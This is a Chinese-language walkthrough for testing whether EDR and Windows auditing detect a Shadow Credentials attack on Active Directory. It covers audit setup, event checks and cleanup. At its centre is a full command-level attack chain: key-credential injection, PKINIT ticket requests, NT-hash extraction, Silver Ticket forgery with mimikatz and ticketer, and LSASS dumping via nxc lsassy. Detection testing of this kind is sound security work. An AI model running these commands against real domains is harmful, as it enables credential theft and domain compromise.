# Shadow Credentials EDR 驗證：一步一步完成指南

本指南讓完全不懂的人也能完成 Shadow Credentials 的 EDR 驗證。照做即可，不做多餘動作，不破壞用戶空間。

---

## 一、準備環境

- 網域控制站（DC）：Windows Server 2016+，具 AD DS
- 目標電腦：已加入網域的 Windows（Server/Workstation）
- 攻擊機：Kali 或等同 Linux，可連 DC
- 測試帳號：對目標電腦物件具 `GenericAll` 或 `WriteProperty`
- 代碼位置：打開倉庫根目錄（以下命令皆於此執行）

---

## 二、預檢（在 DC）

1) 跑 KDC/PKINIT 診斷：

```powershell
.\kdc_pkinit_check.ps1 -TargetComputerName "EC2AMAZ-V903HM1"
# 查看 .\output\kdc_pkinit_check_YYYYMMDD_HHMMSS.txt
```

2) 應達成的狀態：
- 網域/樹系行為版號 >= 7（Windows Server 2016）
- 登錄 `SupportedEncryptionTypes` 包含 AES128(0x8)+AES256(0x10)
- 目標電腦 `msDS-SupportedEncryptionTypes` 設到 0x18
- 本機有 KDC Authentication EKU 的憑證，且在 NTAuth 發佈
- KDC 服務在跑，系統事件無 KDC 錯誤

---

## 三、啟用審計（在 DC）

1) 啟用「Directory Service Changes」：

```powershell
auditpol /get /subcategory:"Directory Service Changes"
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
```

2) 只審計 `msDS-KeyCredentialLink`（最小噪音）：

```powershell
$targetComputer = "EC2AMAZ-V903HM1"
$targetDN = (Get-ADComputer -Identity $targetComputer).DistinguishedName
$sddl = "S:ARAI(AU;SA;WP;{5b47d60f-6090-40b2-9f37-2a4de88f3063};WD)"
dsacls $targetDN /S:"$sddl"
(Get-Acl "AD:$targetDN" -Audit).Audit | Where-Object {
  $_.AuditFlags -match "Success" -and $_.ObjectType -eq '5b47d60f-6090-40b2-9f37-2a4de88f3063'
}
```

---

## 四、確認權限（在 DC）

```powershell
$targetComputer = "EC2AMAZ-V903HM1"
$targetDN = (Get-ADComputer -Identity $targetComputer).DistinguishedName
$acl = Get-Acl "AD:$targetDN"
$acl.Access | Where-Object { $_.IdentityReference -like "*Administrator*" -and ($_.ActiveDirectoryRights -match "GenericAll|WriteProperty") }
```

必要時（僅限測試環境）授予最小權限：

```powershell
dsacls $targetDN /G "sme\Administrator:WP;msDS-KeyCredentialLink"
```

---

## 五、攻擊機環境（在 Kali）

```bash
export DOMAIN="sme.local"
export USER="Administrator"
export PASS="YourPassword"
export DC_IP="10.0.0.206"
export TARGET="EC2AMAZ-V903HM1"
export PROXY="proxychains4"  # 不用代理就移除這行

pip install pywhisker certipy-ad impacket netexec
mkdir -p /tmp/sc_edr_demo && cd /tmp/sc_edr_demo
ping -c 2 $DC_IP
nmap -p 88,389,445,636 $DC_IP
```

---

## 五之二、攻擊機環境（在 Windows）

```powershell
$env:DOMAIN = "sme.local"
$env:USER = "Administrator"
$env:PASS = "YourPassword"
$env:DC_IP = "10.0.0.206"
$env:TARGET = "EC2AMAZ-V903HM1"

# 準備工具：Whisker.exe、Rubeus.exe、mimikatz.exe 已可執行
Get-Command .\Whisker.exe, .\Rubeus.exe, .\mimikatz.exe
```

取得 Domain SID（供後續 Silver Ticket 使用）：

```powershell
Import-Module ActiveDirectory
$DOMAIN_SID = (Get-ADDomain).DomainSID.Value
```

---

## 六、攻擊鏈（1 到 6）

### 攻擊場景 A：Windows

1) 列出 KeyCredentials：

```powershell
.\Whisker.exe list /target:$env:TARGET$ /domain:$env:DOMAIN /dc:$env:DC_IP
```

2) 植入 Shadow Credentials（會產生 5136）：

```powershell
.\Whisker.exe add /target:$env:TARGET$ /domain:$env:DOMAIN /dc:$env:DC_IP /path:shadow.pfx /password:ComplexP@ssw0rd123!
```

3) PKINIT 取 TGT 與嘗試憑證導出：

```powershell
.\Rubeus.exe asktgt /user:$($env:TARGET)$ /certificate:shadow.pfx /password:ComplexP@ssw0rd123! /getcredentials /nowrap
```

4) 擷取 NT Hash（若上一步輸出 NT hash，保存以便後續）：

```powershell
$env:TARGET_HASH = "<NT_HASH_from_Rubeus_output>"
```

5) 鍛造並注入 Silver Ticket（CIFS，使用 mimikatz）：

```powershell
.\mimikatz.exe "kerberos::golden /domain:$($env:DOMAIN) /sid:$env:DOMAIN_SID /rc4:$env:TARGET_HASH /user:Administrator /service:cifs /target:$($env:TARGET).$($env:DOMAIN) /ptt" "exit"
```

6) 使用票進行 SMB 存取：

```powershell
dir \\$($env:TARGET)\ADMIN$
```

### 攻擊場景 B：Linux

1) 列出 KeyCredentials（讀取，不會產生 5136）：

```bash
$PROXY pywhisker -d $DOMAIN -u $USER -p $PASS --dc-ip $DC_IP -t $TARGET$ --action list
```

2) 植入 Shadow Credentials（會產生 5136）：

```bash
$PROXY pywhisker -d $DOMAIN -u $USER -p $PASS --dc-ip $DC_IP \
  -t $TARGET$ --action add \
  --filename /tmp/sc_edr_demo/shadow.pfx \
  --password 'ComplexP@ssw0rd123!'
```

記下 DeviceID 以便清理：

```bash
export DEVICE_ID="a1b2c3d4-..."
```

3) PKINIT 取 TGT（可能成功或回報不支援，同樣有效驗證）：

```bash
$PROXY certipy auth -pfx /tmp/sc_edr_demo/shadow.pfx -dc-ip $DC_IP -domain $DOMAIN -username $TARGET
```

4) 擷取 NT Hash 與 Domain SID：

```bash
$PROXY secretsdump.py $DOMAIN/$USER:$PASS@$DC_IP -just-dc-user $TARGET$
export TARGET_HASH="<NT_HASH_from_output>"
export DOMAIN_SID="S-1-5-21-..."
```

5) 鍛造 Silver Ticket（CIFS）：

```bash
ticketer.py -nthash $TARGET_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -spn cifs/$TARGET.$DOMAIN Administrator -outputfile /tmp/sc_edr_demo/administrator.ccache
export KRB5CCNAME=/tmp/sc_edr_demo/administrator.ccache
```

6) 使用票進行 SMB 存取：

```bash
$PROXY nxc smb $TARGET.$DOMAIN -u Administrator -k --use-kcache --shares
$PROXY nxc smb $TARGET.$DOMAIN -u Administrator -k --use-kcache -M lsassy
```

---

## 七、事件驗證（在 DC）

使用強健的驗證腳本（XML 解析、可參數化）：

```powershell
.\Validate-ShadowCredentialsEDR.ps1 -TargetComputer "EC2AMAZ-V903HM1"
```

可選參數：
- `-PrincipalUser "Administrator"`：檢查使用者名稱（預設 Administrator）
- `-ServiceFilter "cifs"`：服務過濾字首（預設 cifs）
- `-SharePattern "*$"`：檢查的分享名稱樣式（預設 *$）

示例（非預設帳號與服務）：

```powershell
.\Validate-ShadowCredentialsEDR.ps1 -TargetComputer "EC2AMAZ-V903HM1" -PrincipalUser "svc_edr" -ServiceFilter "cifs" -SharePattern "*$"
```

期望至少檢測到：
- 5136（植入必須有）
- 4768（PKINIT TGT 請求，成功或不支援都要有事件）
- 4769（Service Ticket）
- 5145（檔案分享存取）

---

## 八、清理（在 Kali）

```bash
$PROXY pywhisker -d $DOMAIN -u $USER -p $PASS --dc-ip $DC_IP -t $TARGET$ --action remove --device-id $DEVICE_ID
rm -rf /tmp/sc_edr_demo/
unset KRB5CCNAME DOMAIN USER PASS DC_IP TARGET TARGET_HASH DOMAIN_SID DEVICE_ID PROXY
```

---

## 九、歸檔（在 DC）

```powershell
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$reportDir = "C:\EDR_Tests\ShadowCredentials_$timestamp"
New-Item -ItemType Directory -Path $reportDir -Force
$startTime = (Get-Date).AddHours(-1)
Get-WinEvent -FilterHashtable @{LogName='Security';ID=5136,4768,4769,5145;StartTime=$startTime} | Export-Csv "$reportDir\SecurityEvents.csv" -NoTypeInformation
Copy-Item ".\output\kdc_pkinit_check_*.txt" $reportDir -ErrorAction SilentlyContinue
```

---

## 十、常見問題速解

- 沒有 5136：審計政策未啟用或 SACL 未配置到 `msDS-KeyCredentialLink`（重跑第三節）
- PKINIT 不支援：KDC 憑證/NTAuth/鏈/加密型別缺失（重跑第二節診斷）
- 連線問題：先 `ping`/`nmap`，再檢查代理與防火牆
- 權限不足：只在測試環境以 `dsacls` 授權 `msDS-KeyCredentialLink` 的 WriteProperty

---

## 參考檔案

- 使用流程與事件對照：[EDR_VALIDATION_PROCEDURE - 複製.md](file:///c:/Users/aduser/Desktop/PCT/94727-2/94727-2/EDR_VALIDATION_PROCEDURE%20-%20複製.md)
- 攻擊鏈細節：[ZERO_ENDPOINT_ATTACK_CHAIN.md](file:///c:/Users/aduser/Desktop/PCT/94727-2/94727-2/ZERO_ENDPOINT_ATTACK_CHAIN.md)
- 預檢診斷腳本：[kdc_pkinit_check.ps1](file:///c:/Users/aduser/Desktop/PCT/94727-2/94727-2/kdc_pkinit_check.ps1)
- 事件驗證腳本：[Validate-ShadowCredentialsEDR.ps1](file:///c:/Users/aduser/Desktop/PCT/94727-2/94727-2/Validate-ShadowCredentialsEDR.ps1)